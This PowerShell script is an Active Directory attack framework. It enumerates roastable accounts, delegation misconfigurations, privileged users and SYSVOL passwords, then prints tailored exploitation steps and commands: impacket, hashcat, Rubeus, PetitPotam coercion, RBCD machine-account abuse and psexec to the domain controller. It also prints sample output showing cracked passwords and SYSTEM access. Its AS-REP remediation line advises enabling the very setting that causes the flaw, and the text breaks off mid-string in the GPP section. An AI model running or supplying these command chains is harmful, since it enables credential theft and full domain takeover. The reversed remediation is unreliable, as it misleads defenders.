function Write-Banner {
    Clear-Host
    $banner = @"

    ███████╗ █████╗ ███████╗██╗   ██╗     █████╗ ███████╗
    ██╔════╝██╔══██╗██╔════╝╚██╗ ██╔╝    ██╔══██╗██╔════╝
    █████╗  ███████║███████╗ ╚████╔╝     ███████║██║  ███╗
    ██╔══╝  ██╔══██║╚════██║  ╚██╔╝      ██╔══██║██║   ██║
    ███████╗██║  ██║███████║   ██║       ██║  ██║╚██████╔╝
    ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝       ╚═╝  ╚═╝ ╚═════╝ 
                                                            
    Active Directory Enumeration & Exploitation Framework
    Like WinPEAS but for Active Directory - Complete Attack Chain
    Version 3.0 | Run from domain-joined machine
    
"@
    Write-Host $banner -ForegroundColor Cyan
}

function Write-SectionHeader {
    param($Title, $Icon = "[*]")
    Write-Host "`n" + ("=" * 100) -ForegroundColor Cyan
    Write-Host " $Icon $Title".PadRight(99) -ForegroundColor Cyan
    Write-Host ("=" * 100) -ForegroundColor Cyan
}

function Write-SubHeader {
    param($Text, $Color = "White")
    Write-Host "`n[$Text]" -ForegroundColor $Color -BackgroundColor DarkBlue
}

function Write-Finding {
    param(
        [string]$Title,
        [string]$Severity,
        [string]$Description,
        [string]$Impact,
        [string]$Detection,
        [string]$Exploitation,
        [string]$Command,
        [string]$Example,
        [string]$Remediation
    )
    
    $severityColor = switch ($Severity) {
        "CRITICAL" { "Red" }
        "HIGH" { "Magenta" }
        "MEDIUM" { "Yellow" }
        "LOW" { "Green" }
        "INFO" { "Cyan" }
        default { "White" }
    }
    
    Write-Host "`n" + ("┌" + ("─" * 98) + "┐") -ForegroundColor DarkGray
    Write-Host "│ " -NoNewline -ForegroundColor DarkGray
    Write-Host "VULNERABILITY: $Title".PadRight(97) -NoNewline -ForegroundColor White
    Write-Host "│" -ForegroundColor DarkGray
    Write-Host "├" + ("─" * 98) + "┤" -ForegroundColor DarkGray
    
    Write-Host "│ " -NoNewline -ForegroundColor DarkGray
    Write-Host "SEVERITY: " -NoNewline -ForegroundColor White
    Write-Host $Severity.PadRight(88) -NoNewline -ForegroundColor $severityColor
    Write-Host "│" -ForegroundColor DarkGray
    
    if ($Description) {
        Write-Host "│" + (" " * 98) + "│" -ForegroundColor DarkGray
        Write-Host "│ " -NoNewline -ForegroundColor DarkGray
        Write-Host "DESCRIPTION:".PadRight(97) -NoNewline -ForegroundColor Cyan
        Write-Host "│" -ForegroundColor DarkGray
        $Description -split "`n" | ForEach-Object {
            $line = $_.Trim()
            if ($line) {
                Write-Host "│ " -NoNewline -ForegroundColor DarkGray
                Write-Host $line.PadRight(97) -NoNewline -ForegroundColor Gray
                Write-Host "│" -ForegroundColor DarkGray
            }
        }
    }
    
    if ($Impact) {
        Write-Host "│" + (" " * 98) + "│" -ForegroundColor DarkGray
        Write-Host "│ " -NoNewline -ForegroundColor DarkGray
        Write-Host "IMPACT:".PadRight(97) -NoNewline -ForegroundColor Cyan
        Write-Host "│" -ForegroundColor DarkGray
        $Impact -split "`n" | ForEach-Object {
            $line = $_.Trim()
            if ($line) {
                Write-Host "│ " -NoNewline -ForegroundColor DarkGray
                Write-Host $line.PadRight(97) -NoNewline -ForegroundColor Yellow
                Write-Host "│" -ForegroundColor DarkGray
            }
        }
    }
    
    if ($Detection) {
        Write-Host "│" + (" " * 98) + "│" -ForegroundColor DarkGray
        Write-Host "│ " -NoNewline -ForegroundColor DarkGray
        Write-Host "DETECTION:".PadRight(97) -NoNewline -ForegroundColor Cyan
        Write-Host "│" -ForegroundColor DarkGray
        $Detection -split "`n" | ForEach-Object {
            $line = $_.Trim()
            if ($line) {
                Write-Host "│ " -NoNewline -ForegroundColor DarkGray
                Write-Host $line.PadRight(97) -NoNewline -ForegroundColor Gray
                Write-Host "│" -ForegroundColor DarkGray
            }
        }
    }
    
    if ($Exploitation) {
        Write-Host "│" + (" " * 98) + "│" -ForegroundColor DarkGray
        Write-Host "│ " -NoNewline -ForegroundColor DarkGray
        Write-Host "EXPLOITATION STEPS:".PadRight(97) -NoNewline -ForegroundColor Green
        Write-Host "│" -ForegroundColor DarkGray
        $stepNum = 1
        $Exploitation -split "`n" | ForEach-Object {
            $line = $_.Trim()
            if ($line) {
                if ($line -match "^STEP") {
                    Write-Host "│ " -NoNewline -ForegroundColor DarkGray
                    Write-Host $line.PadRight(97) -NoNewline -ForegroundColor Yellow
                    Write-Host "│" -ForegroundColor DarkGray
                } else {
                    Write-Host "│ " -NoNewline -ForegroundColor DarkGray
                    Write-Host $line.PadRight(97) -NoNewline -ForegroundColor White
                    Write-Host "│" -ForegroundColor DarkGray
                }
            }
        }
    }
    
    if ($Command) {
        Write-Host "│" + (" " * 98) + "│" -ForegroundColor DarkGray
        Write-Host "│ " -NoNewline -ForegroundColor DarkGray
        Write-Host "COMMANDS:".PadRight(97) -NoNewline -ForegroundColor Magenta
        Write-Host "│" -ForegroundColor DarkGray
        $Command -split "`n" | ForEach-Object {
            $line = $_.Trim()
            if ($line) {
                Write-Host "│ " -NoNewline -ForegroundColor DarkGray
                Write-Host $line.PadRight(97) -NoNewline -ForegroundColor Yellow
                Write-Host "│" -ForegroundColor DarkGray
            }
        }
    }
    
    if ($Example) {
        Write-Host "│" + (" " * 98) + "│" -ForegroundColor DarkGray
        Write-Host "│ " -NoNewline -ForegroundColor DarkGray
        Write-Host "EXAMPLE OUTPUT:".PadRight(97) -NoNewline -ForegroundColor Cyan
        Write-Host "│" -ForegroundColor DarkGray
        $Example -split "`n" | ForEach-Object {
            $line = $_.Trim()
            if ($line) {
                if ($line.Length -gt 97) {
                    Write-Host "│ " -NoNewline -ForegroundColor DarkGray
                    Write-Host $line.Substring(0, 97) -NoNewline -ForegroundColor Green
                    Write-Host "│" -ForegroundColor DarkGray
                } else {
                    Write-Host "│ " -NoNewline -ForegroundColor DarkGray
                    Write-Host $line.PadRight(97) -NoNewline -ForegroundColor Green
                    Write-Host "│" -ForegroundColor DarkGray
                }
            }
        }
    }
    
    if ($Remediation) {
        Write-Host "│" + (" " * 98) + "│" -ForegroundColor DarkGray
        Write-Host "│ " -NoNewline -ForegroundColor DarkGray
        Write-Host "REMEDIATION:".PadRight(97) -NoNewline -ForegroundColor Cyan
        Write-Host "│" -ForegroundColor DarkGray
        $Remediation -split "`n" | ForEach-Object {
            $line = $_.Trim()
            if ($line) {
                Write-Host "│ " -NoNewline -ForegroundColor DarkGray
                Write-Host $line.PadRight(97) -NoNewline -ForegroundColor Green
                Write-Host "│" -ForegroundColor DarkGray
            }
        }
    }
    
    Write-Host "└" + ("─" * 98) + "┘" -ForegroundColor DarkGray
}

function Invoke-LDAPQuery {
    param(
        [string]$Filter,
        [string[]]$Properties,
        [string]$SearchBase
    )
    
    try {
        $searcher = New-Object DirectoryServices.DirectorySearcher
        if ($SearchBase) {
            $searcher.SearchRoot = New-Object DirectoryServices.DirectoryEntry("LDAP://$SearchBase")
        } else {
            $searcher.SearchRoot = "LDAP://$script:DomainDN"
        }
        $searcher.Filter = $Filter
        $searcher.PageSize = 1000
        $searcher.SizeLimit = 0
        
        foreach ($prop in $Properties) {
            [void]$searcher.PropertiesToLoad.Add($prop)
        }
        
        return $searcher.FindAll()
    }
    catch {
        Write-Host "[!] LDAP Query Error: $_" -ForegroundColor Red
        return $null
    }
}

function Get-DomainInfo {
    Write-SectionHeader "DOMAIN RECONNAISSANCE" "🔍"
    
    try {
        $rootDSE = [ADSI]"LDAP://RootDSE"
        $script:DomainDN = $rootDSE.defaultNamingContext[0]
        $script:DomainName = ($script:DomainDN -replace "DC=","" -replace ",",".").ToLower()
        $script:DomainController = $rootDSE.dnsHostName[0]
        $script:ForestDN = $rootDSE.rootDomainNamingContext[0]
        $script:ConfigDN = $rootDSE.configurationNamingContext[0]
        $script:SchemaDN = $rootDSE.schemaNamingContext[0]
        
        try {
            $script:DCIP = [System.Net.Dns]::GetHostEntry($script:DomainController).AddressList[0].IPAddressToString
        } catch {
            $script:DCIP = "Unknown"
        }
        
        $domain = [ADSI]"LDAP://$script:DomainDN"
        $domainSID = (New-Object System.Security.Principal.SecurityIdentifier($domain.objectSid[0], 0)).Value
        $script:DomainSID = $domainSID
        
        Write-Host "`n[+] Target Domain Information:" -ForegroundColor Green
        Write-Host "    Domain Name:        " -NoNewline; Write-Host $script:DomainName -ForegroundColor White
        Write-Host "    Domain DN:          " -NoNewline; Write-Host $script:DomainDN -ForegroundColor White
        Write-Host "    Domain SID:         " -NoNewline; Write-Host $domainSID -ForegroundColor White
        Write-Host "    Domain Controller:  " -NoNewline; Write-Host $script:DomainController -ForegroundColor White
        Write-Host "    DC IP Address:      " -NoNewline; Write-Host $script:DCIP -ForegroundColor Yellow
        Write-Host "    Forest Root:        " -NoNewline; Write-Host $script:ForestDN -ForegroundColor White
        Write-Host "    Functional Level:   " -NoNewline; Write-Host $domain.msDS-Behavior-Version -ForegroundColor White
        
        $allDCs = Invoke-LDAPQuery -Filter "(primaryGroupID=516)" -Properties @("dNSHostName","operatingSystem","operatingSystemVersion")
        Write-Host "`n[+] Domain Controllers ($($allDCs.Count)):" -ForegroundColor Green
        foreach ($dc in $allDCs) {
            Write-Host "    → $($dc.Properties.dnshostname) - $($dc.Properties.operatingsystem)" -ForegroundColor Gray
        }
        
        $trusts = Invoke-LDAPQuery -Filter "(objectClass=trustedDomain)" -Properties @("name","trustDirection","trustType","trustAttributes")
        if ($trusts.Count -gt 0) {
            Write-Host "`n[+] Domain Trusts Found ($($trusts.Count)):" -ForegroundColor Yellow
            foreach ($trust in $trusts) {
                $trustDir = switch ([int]$trust.Properties.trustdirection[0]) {
                    1 { "Inbound" }
                    2 { "Outbound" }
                    3 { "Bidirectional" }
                    default { "Unknown" }
                }
                Write-Host "    → $($trust.Properties.name) [$trustDir]" -ForegroundColor Cyan
            }
        }
        
        return $true
    }
    catch {
        Write-Host "[!] Failed to connect to domain: $_" -ForegroundColor Red
        return $false
    }
}

function Test-ASREPRoasting {
    Write-SectionHeader "AS-REP ROASTING ATTACK" "🎯"
    
    $filter = "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
    $results = Invoke-LDAPQuery -Filter $filter -Properties @("samAccountName","distinguishedName","pwdLastSet","lastLogon")
    
    if ($results.Count -gt 0) {
        Write-Host "`n[!] VULNERABLE: Found $($results.Count) AS-REP Roastable Accounts!" -ForegroundColor Red
        
        $targetList = @()
        foreach ($user in $results) {
            $samAccount = $user.Properties.samaccountname[0]
            $targetList += $samAccount
            Write-Host "    ✓ $samAccount" -ForegroundColor Yellow
        }
        
        $exploitation = @"
STEP 1: No authentication required - this is your first attack vector
        Kerberos Pre-Authentication is disabled on these accounts
        You can request encrypted TGT without knowing the password

STEP 2: Request AS-REP tickets from Kali Linux
        Use impacket-GetNPUsers to extract hashes
        Tool connects to DC and retrieves encrypted timestamp

STEP 3: Crack offline with Hashcat mode 18200
        Use wordlists like rockyou.txt or custom lists
        Cracking speed depends on GPU (10-100k H/s typical)

STEP 4: Validate compromised credentials
        Test with CrackMapExec or evil-winrm
        Check group memberships and permissions
"@

        $commands = @"
echo '$($targetList -join "`n")' > asrep_users.txt
impacket-GetNPUsers -dc-ip $script:DCIP -usersfile asrep_users.txt -format hashcat -outputfile asrep.hash $script:DomainName/
impacket-GetNPUsers -dc-ip $script:DCIP -no-pass -request $script:DomainName/$($targetList[0])
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt --force -O
crackmapexec smb $script:DCIP -u $($targetList[0]) -p 'CRACKED_PASSWORD'
evil-winrm -i $script:DCIP -u $($targetList[0]) -p 'CRACKED_PASSWORD'
"@

        $example = @"
impacket-GetNPUsers -dc-ip $script:DCIP -no-pass $script:DomainName/$($targetList[0])
`$krb5asrep`$23`$$($targetList[0])@$($script:DomainName.ToUpper()):a1b2c3d4e5f6...

hashcat -m 18200 asrep.hash rockyou.txt
`$krb5asrep`$23`$$($targetList[0])@$($script:DomainName.ToUpper()):a1b2c3d4...:Welcome2024!

crackmapexec smb $script:DCIP -u $($targetList[0]) -p 'Welcome2024!'
SMB    $script:DCIP    445    [+] $script:DomainName\$($targetList[0]):Welcome2024! (Pwn3d!)
"@

        Write-Finding -Title "AS-REP Roasting - Pre-Authentication Disabled" `
            -Severity "HIGH" `
            -Description "Found $($results.Count) user accounts with Kerberos Pre-Authentication disabled. This allows offline password cracking without any authentication." `
            -Impact "• No credentials needed to extract password hashes`n• Offline brute-force attack possible`n• Can lead to initial domain foothold" `
            -Detection "Accounts: $($targetList -join ', ')" `
            -Exploitation $exploitation `
            -Command $commands `
            -Example $example `
            -Remediation "Enable 'Do not require Kerberos preauthentication' for all accounts"
    } else {
        Write-Host "`n[✓] No AS-REP roastable accounts detected" -ForegroundColor Green
    }
}

function Test-Kerberoasting {
    Write-SectionHeader "KERBEROASTING ATTACK" "🎫"
    
    $filter = "(&(servicePrincipalName=*)(objectCategory=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
    $results = Invoke-LDAPQuery -Filter $filter -Properties @("samAccountName","servicePrincipalName","memberOf","pwdLastSet")
    
    if ($results.Count -gt 0) {
        Write-Host "`n[!] Found $($results.Count) Kerberoastable Service Accounts!" -ForegroundColor Yellow
        
        $highValue = @()
        foreach ($account in $results) {
            $sam = $account.Properties.samaccountname[0]
            $spns = $account.Properties.serviceprincipalname
            
            Write-Host "`n    Account: " -NoNewline -ForegroundColor Yellow
            Write-Host $sam -ForegroundColor White
            
            foreach ($spn in $spns) {
                Write-Host "      → $spn" -ForegroundColor Gray
            }
            
            if ($account.Properties.memberof) {
                $groups = $account.Properties.memberof
                foreach ($group in $groups) {
                    if ($group -match "Admin") {
                        Write-Host "      ⚠ Member of: $group" -ForegroundColor Red
                        $highValue += $sam
                    }
                }
            }
        }
        
        $exploitation = @"
STEP 1: Any authenticated domain user can request service tickets
        Request TGS for all SPNs - no special privileges needed
        Tickets encrypted with service account password hash

STEP 2: Extract tickets using Impacket or Rubeus
        Impacket: Works from Linux, requires domain credentials
        Rubeus: Windows tool, can run as current user

STEP 3: Crack with Hashcat mode 13100 (TGS-REP)
        Service accounts often have weak passwords
        Focus on accounts with admin group memberships first

STEP 4: Use cracked credentials for lateral movement
        Check if account has admin rights on other systems
        Look for delegation or ACL abuse opportunities
"@

        $commands = @"
impacket-GetUserSPNs -dc-ip $script:DCIP -request -outputfile kerberoast.hash $script:DomainName/lowpriv:password
impacket-GetUserSPNs -dc-ip $script:DCIP -request-user $($results[0].Properties.samaccountname[0]) $script:DomainName/user:pass
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt --force -O
crackmapexec smb $script:DCIP -u $($results[0].Properties.samaccountname[0]) -p 'CRACKED_PASS' --shares
Rubeus.exe kerberoast /outfile:hashes.txt /nowrap
Rubeus.exe kerberoast /user:$($results[0].Properties.samaccountname[0]) /nowrap
"@

        $example = @"
impacket-GetUserSPNs -dc-ip $script:DCIP -request $script:DomainName/user:pass
ServicePrincipalName              Name      MemberOf
MSSQLSvc/sql01:1433               sqlsvc    CN=Domain Admins,CN=Users...
`$krb5tgs`$23`$*sqlsvc`$$($script:DomainName.ToUpper())`$*`$a1b2c3d4...

hashcat -m 13100 kerberoast.hash rockyou.txt
`$krb5tgs`$23`$*sqlsvc`$...:SQL@dmin123
Recovered: 1/1 (100.00%)
"@

        Write-Finding -Title "Kerberoasting - Service Account Password Extraction" `
            -Severity "HIGH" `
            -Description "Identified $($results.Count) service accounts with SPNs. Any domain user can request tickets for offline cracking." `
            -Impact "• Service accounts often have weak passwords`n• May have elevated privileges`n• Leads to lateral movement opportunities" `
            -Detection "High-value targets: $($highValue -join ', ')" `
            -Exploitation $exploitation `
            -Command $commands `
            -Example $example `
            -Remediation "Use strong passwords (25+ chars) for service accounts, implement MSA/gMSA"
    } else {
        Write-Host "`n[✓] No kerberoastable accounts found" -ForegroundColor Green
    }
}

function Test-UnconstrainedDelegation {
    Write-SectionHeader "UNCONSTRAINED DELEGATION" "⚠️"
    
    $filter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
    $results = Invoke-LDAPQuery -Filter $filter -Properties @("samAccountName","dNSHostName","operatingSystem","servicePrincipalName")
    
    if ($results.Count -gt 0) {
        Write-Host "`n[!!] CRITICAL: Found $($results.Count) Systems with Unconstrained Delegation!" -ForegroundColor Red
        
        foreach ($computer in $results) {
            Write-Host "`n    Host: " -NoNewline -ForegroundColor Red
            Write-Host "$($computer.Properties.dnshostname[0])" -ForegroundColor Yellow
            Write-Host "    Account: $($computer.Properties.samaccountname[0])" -ForegroundColor Gray
            Write-Host "    OS: $($computer.Properties.operatingsystem[0])" -ForegroundColor Gray
        }
        
        $exploitation = @"
STEP 1: Compromise the unconstrained delegation server
        Gain local admin or SYSTEM on this server
        Must have elevated privileges to monitor tickets

STEP 2: Monitor for TGTs using Rubeus (requires Admin/SYSTEM)
        Run: Rubeus.exe monitor /interval:5 /nowrap
        Wait for privileged users to authenticate

STEP 3: Force authentication from privileged account
        From Kali: impacket-printerbug or PetitPotam
        Coerce DC or DA to authenticate to delegation server
        Their TGT will be cached on the server

STEP 4: Extract and reuse the TGT
        Rubeus captures base64 ticket automatically
        Convert to ccache: impacket-ticketConverter
        Use with impacket tools for Domain Admin access

STEP 5: Full domain compromise
        With DA TGT, use psexec/wmiexec to DC
        DCSync to dump all hashes including KRBTGT
"@

        $commands = @"
Rubeus.exe monitor /interval:5 /filteruser:Administrator /nowrap

impacket-printerbug $script:DomainName/user:pass@$script:DomainController $($results[0].Properties.dnshostname[0])
python3 PetitPotam.py -d $script:DomainName -u user -p pass $($results[0].Properties.dnshostname[0]) $script:DomainController

echo "BASE64_TICKET_HERE" | base64 -d > ticket.kirbi
impacket-ticketConverter ticket.kirbi admin.ccache
export KRB5CCNAME=admin.ccache
impacket-psexec -k -no-pass $script:DomainName/Administrator@$script:DomainController
"@

        $example = @"
C:\>Rubeus.exe monitor /interval:5 /filteruser:Administrator
[*] Monitoring every 5 seconds for new TGTs

[*] 12/1/2024 3:45:22 PM - Found new TGT:
  User: Administrator@$($script:DomainName.ToUpper())
  StartTime: 12/1/2024 3:45:20 PM
  EndTime: 12/2/2024 1:45:20 AM
  Base64EncodedTicket: doIFuj...

impacket-psexec -k -no-pass Administrator@$script:DomainController
C:\Windows\system32>whoami
nt authority\system
"@

        Write-Finding -Title "Unconstrained Delegation - TGT Theft" `
            -Severity "CRITICAL" `
            -Description "Servers with unconstrained delegation can impersonate any user. Compromising these servers allows stealing TGTs of authenticating users." `
            -Impact "• Direct path to Domain Admin`n• Can capture and reuse any user's TGT`n• Leads to complete domain compromise" `
            -Detection "Vulnerable servers: $($results.Properties.dnshostname -join ', ')" `
            -Exploitation $exploitation `
            -Command $commands `
            -Example $example `
            -Remediation "Remove unconstrained delegation, use constrained delegation or RBCD instead"
    } else {
        Write-Host "`n[✓] No unconstrained delegation detected" -ForegroundColor Green
    }
}

function Test-ConstrainedDelegation {
    Write-SectionHeader "CONSTRAINED DELEGATION" "🔗"
    
    $filter = "(msDS-AllowedToDelegateTo=*)"
    $results = Invoke-LDAPQuery -Filter $filter -Properties @("samAccountName","msDS-AllowedToDelegateTo","dNSHostName","objectClass")
    
    if ($results.Count -gt 0) {
        Write-Host "`n[!] Found $($results.Count) Accounts with Constrained Delegation!" -ForegroundColor Yellow
        
        foreach ($obj in $results) {
            $sam = $obj.Properties.samaccountname[0]
            $delegateTo = $obj.Properties.'msds-allowedtodelegateto'
            
            Write-Host "`n    Account: " -NoNewline -ForegroundColor Yellow
            Write-Host $sam -ForegroundColor White
            Write-Host "    Allowed to delegate to:" -ForegroundColor Cyan
            
            foreach ($target in $delegateTo) {
                Write-Host "      → $target" -ForegroundColor Gray
            }
        }
        
        $exploitation = @"
STEP 1: Obtain credentials of the delegated account
        Need password, NTLM hash, or AES key
        If machine account, dump with Mimikatz/Rubeus

STEP 2: Use S4U2Self and S4U2Proxy extensions
        Request ticket for any user (Administrator)
        Proxy to allowed service SPN

STEP 3: Alternative service substitution
        Can request different service on same host
        Example: Allowed LDAP → Request CIFS/HTTP

STEP 4: Exploit the service access
        With CIFS → psexec, file access
        With LDAP → DCSync, admin operations
        With HTTP → Web application compromise
"@

        $firstTarget = $results[0].Properties.'msds-allowedtodelegateto'[0]
        $hostname = ($firstTarget -split '/')[1] -replace ':.*$',''
        
        $commands = @"
Rubeus.exe s4u /user:$($results[0].Properties.samaccountname[0]) /rc4:NTLM_HASH /impersonateuser:Administrator /msdsspn:$firstTarget /ptt
Rubeus.exe s4u /user:$($results[0].Properties.samaccountname[0]) /aes256:AES_KEY /impersonateuser:Administrator /msdsspn:cifs/$hostname /altservice:ldap,cifs,http /ptt
impacket-getST -spn $firstTarget -impersonate Administrator -dc-ip $script:DCIP $script:DomainName/$($results[0].Properties.samaccountname[0]):Password
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass Administrator@$hostname
"@

        $example = @"
Rubeus.exe s4u /user:websvc /rc4:abc123... /impersonateuser:Administrator /msdsspn:http/web01 /altservice:cifs /ptt
[*] Using domain controller: $script:DomainController
[*] S4U2Self success!
[*] S4U2Proxy success!
[*] Ticket successfully imported!

dir \\web01\c$
C:\>whoami /groups
CORP\Domain Admins
"@

        Write-Finding -Title "Constrained Delegation - Service Impersonation" `
            -Severity "HIGH" `
            -Description "Accounts can impersonate users to specific services. Can be abused for lateral movement and privilege escalation." `
            -Impact "• Impersonate any user to allowed services`n• Service substitution possible`n• Can lead to admin access on target systems" `
            -Detection "Found $($results.Count) delegated accounts" `
            -Exploitation $exploitation `
            -Command $commands `
            -Example $example `
            -Remediation "Use Resource-Based Constrained Delegation with proper ACLs"
    } else {
        Write-Host "`n[✓] No constrained delegation configured" -ForegroundColor Green
    }
}

function Test-RBCD {
    Write-SectionHeader "RESOURCE-BASED CONSTRAINED DELEGATION (RBCD)" "🎭"
    
    $filter = "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)"
    $results = Invoke-LDAPQuery -Filter $filter -Properties @("samAccountName","dNSHostName","msDS-AllowedToActOnBehalfOfOtherIdentity")
    
    if ($results.Count -gt 0) {
        Write-Host "`n[!!] Found $($results.Count) Objects with RBCD Configured!" -ForegroundColor Red
        
        foreach ($obj in $results) {
            Write-Host "    → $($obj.Properties.samaccountname[0])" -ForegroundColor Yellow
        }
        
        $exploitation = @"
STEP 1: Check Machine Account Quota (ms-DS-MachineAccountQuota)
        Default is 10 - any domain user can create 10 computers
        Query: Get-ADDomain | select ms-DS-MachineAccountQuota

STEP 2: Create new machine account under your control
        Use impacket-addcomputer or PowerMad
        Set known password for the new computer

STEP 3: Modify msDS-AllowedToActOnBehalfOfOtherIdentity
        Add your new computer to target's RBCD attribute
        Requires GenericWrite/GenericAll on target

STEP 4: Perform S4U attack
        Request TGT for your machine account
        Impersonate Administrator to target
        Access target system as Domain Admin

STEP 5: Cleanup (optional)
        Remove RBCD entry
        Delete created machine account
"@

        $commands = @"
Get-ADDomain | select -ExpandProperty DistinguishedName | % { Get-ADObject $_ -Properties ms-DS-MachineAccountQuota }

impacket-addcomputer -computer-name 'ATTACKPC$' -computer-pass 'AttackPass123!' -dc-ip $script:DCIP $script:DomainName/user:password

python3 rbcd.py -dc-ip $script:DCIP -t $($results[0].Properties.samaccountname[0]) -f 'ATTACKPC$' -action write $script:DomainName/user:password

impacket-getST -spn cifs/$($results[0].Properties.dnshostname[0]) -impersonate Administrator -dc-ip $script:DCIP $script:DomainName/'ATTACKPC$':'AttackPass123!'

export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass Administrator@$($results[0].Properties.dnshostname[0])
"@

        $example = @"
impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'Pass123' $script:DomainName/user:password
[*] Successfully added machine account EVIL$ with password Pass123

python3 rbcd.py -dc-ip $script:DCIP -t TARGET$ -f EVIL$ -action write $script:DomainName/user:pass
[*] Delegation rights modified successfully!

impacket-getST -spn cifs/target.corp.com -impersonate Administrator $script:DomainName/EVIL$:Pass123
[*] Saving ticket in Administrator.ccache

impacket-psexec -k -no-pass Administrator@target.corp.com
C:\Windows\system32>whoami
nt authority\system
"@

        Write-Finding -Title "Resource-Based Constrained Delegation" `
            -Severity "CRITICAL" `
            -Description "RBCD allows computers to specify which accounts can delegate to them. Can be abused with machine account creation." `
            -Impact "• Create malicious computer accounts`n• Compromise target systems`n• Potential domain-wide escalation" `
            -Detection "Configured on: $($results.Properties.samaccountname -join ', ')" `
            -Exploitation $exploitation `
            -Command $commands `
            -Example $example `
            -Remediation "Set ms-DS-MachineAccountQuota to 0, monitor RBCD attribute changes"
    } else {
        Write-Host "`n[✓] No RBCD configuration detected" -ForegroundColor Green
    }
}

function Test-PasswordPolicies {
    Write-SectionHeader "PASSWORD POLICY ANALYSIS" "🔐"
    
    try {
        $domain = [ADSI]"LDAP://$script:DomainDN"
        $minPwdLength = $domain.minPwdLength[0]
        $minPwdAge = [TimeSpan]::FromTicks([Math]::Abs($domain.minPwdAge[0])).Days
        $maxPwdAge = [TimeSpan]::FromTicks([Math]::Abs($domain.maxPwdAge[0])).Days
        $pwdHistoryLength = $domain.pwdHistoryLength[0]
        $lockoutThreshold = $domain.lockoutThreshold[0]
        $lockoutDuration = [TimeSpan]::FromTicks([Math]::Abs($domain.lockoutDuration[0])).Minutes
        
        Write-Host "`n[*] Default Domain Password Policy:" -ForegroundColor Cyan
        Write-Host "    Minimum Password Length:    $minPwdLength characters" -ForegroundColor $(if($minPwdLength -lt 14){'Red'}else{'Green'})
        Write-Host "    Password Complexity:        Enabled" -ForegroundColor Gray
        Write-Host "    Minimum Password Age:       $minPwdAge days" -ForegroundColor Gray
        Write-Host "    Maximum Password Age:       $maxPwdAge days" -ForegroundColor $(if($maxPwdAge -gt 90){'Yellow'}else{'Green'})
        Write-Host "    Password History:           $pwdHistoryLength passwords" -ForegroundColor $(if($pwdHistoryLength -lt 24){'Yellow'}else{'Green'})
        Write-Host "    Account Lockout Threshold:  $lockoutThreshold attempts" -ForegroundColor $(if($lockoutThreshold -eq 0){'Red'}else{'Green'})
        if ($lockoutThreshold -gt 0) {
            Write-Host "    Lockout Duration:           $lockoutDuration minutes" -ForegroundColor Gray
        }
        
        if ($minPwdLength -lt 14 -or $lockoutThreshold -eq 0) {
            Write-Host "`n    [!] Weak password policy detected!" -ForegroundColor Red
            Write-Host "        Recommended: 14+ chars, lockout after 5 attempts" -ForegroundColor Yellow
        }
        
        $fgpp = Invoke-LDAPQuery -Filter "(objectClass=msDS-PasswordSettings)" -Properties @("name","msDS-MinimumPasswordLength","msDS-LockoutThreshold") -SearchBase "CN=Password Settings Container,CN=System,$script:DomainDN"
        
        if ($fgpp.Count -gt 0) {
            Write-Host "`n[*] Fine-Grained Password Policies ($($fgpp.Count)):" -ForegroundColor Cyan
            foreach ($policy in $fgpp) {
                Write-Host "    → $($policy.Properties.name[0])" -ForegroundColor Yellow
                Write-Host "      Min Length: $($policy.Properties.'msds-minimumpasswordlength'[0])" -ForegroundColor Gray
                Write-Host "      Lockout: $($policy.Properties.'msds-lockoutthreshold'[0]) attempts" -ForegroundColor Gray
            }
        }
        
    } catch {
        Write-Host "[!] Error querying password policy: $_" -ForegroundColor Red
    }
}

function Test-PrivilegedUsers {
    Write-SectionHeader "PRIVILEGED ACCOUNT ENUMERATION" "👑"
    
    $adminGroups = @{
        "Domain Admins" = "S-1-5-21-.*-512"
        "Enterprise Admins" = "S-1-5-21-.*-519"
        "Schema Admins" = "S-1-5-21-.*-518"
        "Administrators" = "S-1-5-32-544"
        "Account Operators" = "S-1-5-32-548"
        "Server Operators" = "S-1-5-32-549"
        "Backup Operators" = "S-1-5-32-551"
        "Print Operators" = "S-1-5-32-550"
    }
    
    foreach ($groupName in $adminGroups.Keys) {
        $members = Invoke-LDAPQuery -Filter "(&(objectCategory=user)(memberOf:1.2.840.113556.1.4.1941:=CN=$groupName,CN=Users,$script:DomainDN))" -Properties @("samAccountName","lastLogon","pwdLastSet")
        
        if ($members.Count -gt 0) {
            Write-Host "`n[*] $groupName Members ($($members.Count)):" -ForegroundColor Yellow
            foreach ($member in $members) {
                $lastLogon = "Never"
                if ($member.Properties.lastlogon[0]) {
                    try {
                        $lastLogon = [DateTime]::FromFileTime($member.Properties.lastlogon[0]).ToString("yyyy-MM-dd")
                    } catch {}
                }
                Write-Host "    → $($member.Properties.samaccountname[0]) (Last Logon: $lastLogon)" -ForegroundColor Gray
            }
        }
    }
    
    $adminCount = Invoke-LDAPQuery -Filter "(&(objectCategory=user)(adminCount=1))" -Properties @("samAccountName","memberOf")
    Write-Host "`n[*] Users with AdminCount=1 ($($adminCount.Count)):" -ForegroundColor Cyan
    foreach ($user in $adminCount) {
        Write-Host "    → $($user.Properties.samaccountname[0])" -ForegroundColor Gray
    }
}

function Test-GPPPasswords {
    Write-SectionHeader "GROUP POLICY PREFERENCE PASSWORDS" "📁"
    
    Write-Host "`n[*] Searching for GPP passwords in SYSVOL..." -ForegroundColor Cyan
    
    $sysvolPath = "\\$script:DomainName\SYSVOL\$script:DomainName\Policies"
    
    if (Test-Path $sysvolPath) {
        $xmlFiles = Get-ChildItem -Path $sysvolPath -Recurse -Include @("Groups.xml","Services.xml","Scheduledtasks.xml","DataSources.xml","Printers.xml","Drives.xml") -ErrorAction SilentlyContinue
        
        $foundCreds = @()
        foreach ($file in $xmlFiles) {
            $content = Get-Content $file.FullName -ErrorAction SilentlyContinue
            if ($content -match "cpassword") {
                Write-Host "    [!] Found cpassword in: $($file.FullName)" -ForegroundColor Red
                $foundCreds += $file.FullName
            }
        }
        
        if ($foundCreds.Count -gt 0) {
            $exploitation = @"
STEP 1: GPP passwords are encrypted with published AES key
